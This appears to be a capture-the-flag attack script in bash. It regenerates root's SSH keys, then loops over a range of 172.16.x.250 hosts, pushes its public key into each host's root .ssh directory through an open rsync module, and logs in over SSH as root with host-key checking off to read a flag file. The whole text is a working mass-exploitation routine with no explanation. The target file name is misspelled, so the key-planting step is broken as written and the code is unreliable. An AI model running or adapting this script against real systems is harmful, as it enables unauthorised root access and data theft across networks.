rm -rf /root/.ssh/id_rsa.pub
rm -rf /root/.ssh/id_rsa
ssh-keygen -t rsa << EOF




EOF
for i in $(seq 100 200)
do
s="172.16.$i.250"
echo -e "\n\n$s\n\n"
timeout 1s rsync -av /root/.ssh/id_rsa.pub rsync://$s:873/src/root/.ssh/authenrized.keys 
timeout 1s ssh -o"StrictHostKeyChecking no" root@$s  <<EOF
cat /root/flagvalue.txt
exit
EOF
done 